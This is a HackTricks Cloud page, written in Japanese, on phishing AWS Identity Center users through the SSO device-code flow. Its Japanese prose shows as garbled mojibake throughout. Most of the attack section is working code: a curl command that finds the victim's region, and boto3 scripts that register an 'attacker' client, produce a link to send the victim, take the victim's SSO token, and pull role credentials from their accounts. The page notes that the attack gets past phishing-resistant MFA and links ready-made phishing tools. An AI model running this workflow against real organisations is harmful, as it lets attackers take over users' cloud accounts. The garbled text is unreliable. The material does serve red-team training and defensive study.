# AWS - Identity Center & SSO Unauthenticated Enum

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

## AWSãƒ‡ãƒã‚¤ã‚¹ã‚³ãƒ¼ãƒ‰ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°

æœ€åˆã«[**ã“ã®ãƒ–ãƒ­ã‚°è¨˜äº‹**](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)ã§ææ¡ˆã•ã‚ŒãŸã‚ˆã†ã«ã€AWS SSOã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«**ãƒªãƒ³ã‚¯**ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒå—ã‘å…¥ã‚Œã‚Œã°**ã€æ”»æ’ƒè€…ã¯**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å½è£…ã™ã‚‹ãŸã‚ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã—**ã€**Identity Center**ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã™ã¹ã¦ã®ãƒ­ãƒ¼ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

ã“ã®æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®è¦ä»¶ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

* è¢«å®³è€…ã¯**Identity Center**ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™
* æ”»æ’ƒè€…ã¯è¢«å®³è€…ãŒä½¿ç”¨ã—ã¦ã„ã‚‹**ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³**ã‚’çŸ¥ã£ã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ `<victimsub>.awsapps.com/start`

å‰è¿°ã®æƒ…å ±ã ã‘ã§ã€**æ”»æ’ƒè€…ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ãƒªãƒ³ã‚¯ã‚’é€ä¿¡ã§ã**ã€**å—ã‘å…¥ã‚Œã‚‰ã‚Œã‚Œã°**ã€**æ”»æ’ƒè€…ã¯AWSãƒ¦ãƒ¼ã‚¶ãƒ¼**ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### æ”»æ’ƒ

1. **ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³ã®ç‰¹å®š**

æ”»æ’ƒè€…ã®æœ€åˆã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ã€è¢«å®³è€…ã®ä¼šç¤¾ãŒIdentity Centerã§ä½¿ç”¨ã—ã¦ã„ã‚‹ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’ç‰¹å®šã™ã‚‹ã“ã¨ã§ã™ã€‚ã“ã‚Œã¯**OSINT**ã¾ãŸã¯**æ¨æ¸¬ + ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹**ã‚’ä½¿ç”¨ã—ã¦è¡Œã†ã“ã¨ãŒã§ãã€ã»ã¨ã‚“ã©ã®ä¼šç¤¾ã¯ã“ã“ã§è‡ªç¤¾åã¾ãŸã¯ãã®ãƒãƒªã‚¨ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã™ã€‚

ã“ã®æƒ…å ±ã‚’ã‚‚ã¨ã«ã€Identity CenterãŒè¨­å®šã•ã‚ŒãŸãƒªãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ï¼š
```bash
curl https://victim.awsapps.com/start/ -s | grep -Eo '"region":"[a-z0-9\-]+"'
"region":"us-east-1
```
2. **è¢«å®³è€…ã®ãƒªãƒ³ã‚¯ã‚’ç”Ÿæˆã—ã¦é€ä¿¡ã™ã‚‹**

æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã¦ã€è¢«å®³è€…ãŒèªè¨¼ã§ãã‚‹AWS SSOãƒ­ã‚°ã‚¤ãƒ³ãƒªãƒ³ã‚¯ã‚’ç”Ÿæˆã—ã¾ã™ã€‚\
ãƒ‡ãƒ¢ã®ãŸã‚ã«ã€ã“ã®ã‚³ãƒ¼ãƒ‰ã‚’Pythonã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã§å®Ÿè¡Œã—ã€å¾Œã§ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã„ãã¤ã‹ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒå¿…è¦ã«ãªã‚‹ã®ã§ã€çµ‚äº†ã—ãªã„ã§ãã ã•ã„:
```python
import boto3

REGION = 'us-east-1' # CHANGE THIS
AWS_SSO_START_URL = 'https://victim.awsapps.com/start' # CHANGE THIS

sso_oidc = boto3.client('sso-oidc', region_name=REGION)
client = sso_oidc.register_client(
clientName = 'attacker',
clientType = 'public'
)

client_id = client.get('clientId')
client_secret = client.get('clientSecret')
authz = sso_oidc.start_device_authorization(
clientId=client_id,
clientSecret=client_secret,
startUrl=AWS_SSO_START_URL
)

url = authz.get('verificationUriComplete')
deviceCode = authz.get('deviceCode')
print("Give this URL to the victim: " + url)
```
ç”Ÿæˆã—ãŸãƒªãƒ³ã‚¯ã‚’è¢«å®³è€…ã«é€ä¿¡ã—ã€ã‚ãªãŸã®ç´ æ™´ã‚‰ã—ã„ã‚½ãƒ¼ã‚·ãƒ£ãƒ«ã‚¨ãƒ³ã‚¸ãƒ‹ã‚¢ãƒªãƒ³ã‚°ã‚¹ã‚­ãƒ«ã‚’ä½¿ã„ã¾ã—ã‚‡ã†ï¼

3. **è¢«å®³è€…ãŒãã‚Œã‚’å—ã‘å…¥ã‚Œã‚‹ã®ã‚’å¾…ã¤**

è¢«å®³è€…ãŒ**ã™ã§ã«AWSã«ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã‚‹**å ´åˆã€æ¨©é™ã‚’ä»˜ä¸ã™ã‚‹ã“ã¨ã‚’å—ã‘å…¥ã‚Œã‚‹ã ã‘ã§æ¸ˆã¿ã¾ã™ã€‚ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ãªã„å ´åˆã¯ã€**ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã‹ã‚‰æ¨©é™ã‚’ä»˜ä¸ã™ã‚‹ã“ã¨ã‚’å—ã‘å…¥ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚\
ã“ã‚ŒãŒç¾åœ¨ã®ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆã®è¦‹ãŸç›®ã§ã™ï¼š

<figure><img src="../../../.gitbook/assets/image (343).png" alt="" width="311"><figcaption></figcaption></figure>

4. **SSOã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã™ã‚‹**

è¢«å®³è€…ãŒãƒ—ãƒ­ãƒ³ãƒ—ãƒˆã‚’å—ã‘å…¥ã‚ŒãŸå ´åˆã€ã“ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã¦**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å½è£…ã—ã¦SSOãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆã—ã¾ã™**ï¼š
```python
token_response = sso_oidc.create_token(
clientId=client_id,
clientSecret=client_secret,
grantType="urn:ietf:params:oauth:grant-type:device_code",
deviceCode=deviceCode
)
sso_token = token_response.get('accessToken')
```
SSOã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã¯**8æ™‚é–“æœ‰åŠ¹**ã§ã™ã€‚

5. **ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ãªã‚Šã™ã¾ã™**
```python
sso_client = boto3.client('sso', region_name=REGION)

# List accounts where the user has access
aws_accounts_response = sso_client.list_accounts(
accessToken=sso_token,
maxResults=100
)
aws_accounts_response.get('accountList', [])

# Get roles inside an account
roles_response = sso_client.list_account_roles(
accessToken=sso_token,
accountId=<account_id>
)
roles_response.get('roleList', [])

# Get credentials over a role

sts_creds = sso_client.get_role_credentials(
accessToken=sso_token,
roleName=<role_name>,
accountId=<account_id>
)
sts_creds.get('roleCredentials')
```
### ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ä¸å¯èƒ½ãªMFA

ä»¥å‰ã®æ”»æ’ƒãŒ**ã€Œãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ä¸å¯èƒ½ãªMFAã€ï¼ˆwebAuthï¼‰ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã¦ã‚‚æ©Ÿèƒ½ã™ã‚‹**ã“ã¨ã‚’çŸ¥ã‚‹ã®ã¯æ¥½ã—ã„ã§ã™ã€‚ã“ã‚Œã¯ã€ä»¥å‰ã®**ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹OAuthãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’é›¢ã‚Œãªã„ãŸã‚**ã§ã™ã€‚ä»–ã®ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°æ”»æ’ƒã¨ã¯ç•°ãªã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ­ã‚°ã‚¤ãƒ³ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’å½è£…ã™ã‚‹å¿…è¦ãŒãªã„å ´åˆã€ãƒ‡ãƒã‚¤ã‚¹ã‚³ãƒ¼ãƒ‰ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ãŒæº–å‚™ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€**ãƒ‡ãƒã‚¤ã‚¹ã«ã‚ˆã£ã¦çŸ¥ã‚‰ã‚Œã¦ã„ã‚‹ã‚³ãƒ¼ãƒ‰**ãŒã‚ã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ç•°ãªã‚‹ãƒã‚·ãƒ³ã§ã‚‚ãƒ­ã‚°ã‚¤ãƒ³ã§ãã¾ã™ã€‚ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆã‚’å—ã‘å…¥ã‚Œã‚‹ã¨ã€ãƒ‡ãƒã‚¤ã‚¹ã¯**åˆæœŸã‚³ãƒ¼ãƒ‰ã‚’çŸ¥ã£ã¦ã„ã‚‹ã ã‘ã§**ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãŸã‚ã«**è³‡æ ¼æƒ…å ±ã‚’å–å¾—ã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚

è©³ç´°ã«ã¤ã„ã¦ã¯ã€[**ã“ã®æŠ•ç¨¿ã‚’ç¢ºèªã—ã¦ãã ã•ã„**](https://mjg59.dreamwidth.org/62175.html)ã€‚

### è‡ªå‹•ãƒ„ãƒ¼ãƒ«

* [https://github.com/christophetd/aws-sso-device-code-authentication](https://github.com/christophetd/aws-sso-device-code-authentication)
* [https://github.com/sebastian-mora/awsssome\_phish](https://github.com/sebastian-mora/awsssome\_phish)

## å‚è€ƒæ–‡çŒ®

* [https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)
* [https://ruse.tech/blogs/aws-sso-phishing](https://ruse.tech/blogs/aws-sso-phishing)
* [https://mjg59.dreamwidth.org/62175.html](https://mjg59.dreamwidth.org/62175.html)
* [https://ramimac.me/aws-device-auth](https://ramimac.me/aws-device-auth)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
